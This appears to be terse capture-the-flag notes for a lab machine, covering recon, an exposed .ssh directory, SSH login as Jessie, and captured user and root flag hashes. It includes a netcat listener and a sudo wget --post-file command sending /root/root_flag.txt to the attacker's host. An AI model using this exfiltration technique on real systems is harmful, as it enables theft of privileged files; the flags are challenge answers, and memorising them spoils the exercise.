@@ -1,0 +1,19 @@
+### PORT
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+
+http://10.10.28.211/sitemap/.ssh/
+
+view-source:http://10.10.28.211/
+
+username: Jessie
+
+ssh jessie@10.10.28.211
+
+cat Documents/user_flag.txt 
+057c67131c3d5e42dd5cd3075b198ff6
+
+nc -lvnp 4444
+
+sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.2.64.179:4444
+
+b1b968b37519ad1daa6408188649263d
